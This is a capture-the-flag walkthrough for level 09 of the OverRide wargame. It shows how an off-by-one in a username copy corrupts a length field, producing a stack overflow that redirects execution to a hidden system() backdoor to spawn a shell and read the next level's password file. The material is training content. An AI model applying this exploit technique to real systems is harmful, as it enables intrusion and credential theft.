# Level 09

## Base analysis

```
level09@OverRide:~$ checksec --file ./level09
RELRO         STACK CANARY      NX            PIE       FILE
Partial RELRO  No canary found  NX enabled    PIE       /home/users/level09/level09
```

A 64-bit "l33t-m$n" messaging program. There's a `secret_backdoor` function that isn't called anywhere:

```c
void secret_backdoor(void) {
    char local_88[128];
    fgets(local_88, 0x80, stdin);
    system(local_88);          // runs whatever we type
}
```

Our goal is to redirect execution into it. Since it's PIE, we'll need its runtime address.

## Reverse engineering

`handle_msg` holds a message struct on the stack and fills it in two steps:

```c
struct { char msg[140]; char username[40]; int msglen; };   // msglen at offset 0xb4
set_username(&s);   // s.msglen initialised to 0x8c = 140
set_msg(&s);
```

### The length field can be corrupted

`set_username` copies the username into the struct at offset `0x8c`, looping **up to 41 bytes** (indices 0..40):

```c
for (i = 0; i < 0x29 && name[i]; i++)
    struct[0x8c + i] = name[i];
```

The struct's `msglen` field is at offset `0xb4`, and `0xb4 - 0x8c = 40`. So index 40 — the 41st byte of the username — writes straight onto the first byte of `msglen`. A 41-byte username of `\xff` turns `msglen` from 140 into a large value.

### The overflow

`set_msg` then copies our message with the corrupted length:

```c
fgets(temp, 0x400, stdin);              // read up to 1024 bytes
strncpy(struct, temp, struct->msglen);  // msglen now huge -> overflow
```

With `msglen` blown up, `strncpy` copies far past the struct and overwrites `handle_msg`'s **saved return address**.

To find the offset, we send a **cyclic pattern** as the message (each 8-byte chunk unique: `Aa0Aa1Aa2...`), let the `ret` crash on a bogus address, then read what landed in RIP:

```
(gdb) run < input        # input = 41*\xff , then the pattern
 ... SIGSEGV ...
(gdb) info registers rip  # e.g. 0x6641356641346641  (ASCII of the pattern)
(gdb) cyclic -l 0x6641356641346641
200
```

Since every chunk appears only once, those bytes pin down exactly one position in our input — that position (200) is the padding before the return address. It matches the frame layout too: `sub rsp,0xc0` (192) + saved RBP (8) = 200.

## Exploitation

Two lines of input:

1. **Username** = 40 * 'a' + '\xd4' — overwrites `msglen` so the next copy overflows.
2. **Message** = 200 bytes of padding + the address of `secret_backdoor`.

When `handle_msg` returns, it jumps into `secret_backdoor`, which reads a line and passes it to `system`. We feed it `/bin/sh`.

```
(gdb) b main
(gdb) run
(gdb) p secret_backdoor
$1 = {<text variable>} 0x5555555548xx <secret_backdoor>
```

Then change the exploit09 script so it uses the correct adress if needed and run it like so :

```bash
python /tmp/exploit09.py > /tmp/inj09 && cat /tmp/inj09 - | ./level09
```

Exploit09 generate the inputs given to level09 in order to overflow, go to the secret backdoor, and run /bin/sh

```
$ cat /home/users/end/.pass
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

Level 09, clear... OverRide complete!
